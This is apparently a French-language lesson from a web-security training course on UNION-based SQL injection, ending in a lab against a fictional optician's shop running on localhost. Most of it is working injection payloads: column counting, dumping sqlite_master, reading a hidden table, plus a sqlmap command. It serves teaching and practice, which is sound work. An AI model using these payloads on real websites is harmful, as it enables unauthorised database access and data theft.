Afficher tous les produits, c'est bien. Lire **d'autres tables**, c'est mieux. L'opérateur `UNION` colle le résultat d'une seconde requête sous la première.

## Étape 1 : compter les colonnes

`UNION` exige le même nombre de colonnes des deux côtés. On teste :

```
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --      ← erreur : il y a donc 2 colonnes
```

## Étape 2 : afficher une valeur à soi

```
' UNION SELECT 'test', 'test' --
```

Si `test` apparaît dans la page, tu contrôles ce qui s'affiche.

## Étape 3 : lister les tables

La boutique utilise SQLite. La liste des tables est dans `sqlite_master` :

```
' UNION SELECT name, sql FROM sqlite_master --
```

Sous MySQL, ce serait `information_schema.tables` ; sous PostgreSQL, `pg_tables`.

## Étape 4 : lire la table intéressante

Une fois le nom et les colonnes connus :

```
' UNION SELECT colonne1, colonne2 FROM table_secrete --
```

## Automatiser

**sqlmap** fait tout cela seul. Utilise-le après avoir compris à la main, jamais avant :

```bash
sqlmap -u "http://127.0.0.1:8090/recherche?q=test" --tables
```

## Le lab : Fichier clients

La recherche de Morel Optique est vulnérable. Quelque part dans la base se trouve une table qui n'a rien à faire là. Rapporte son contenu.
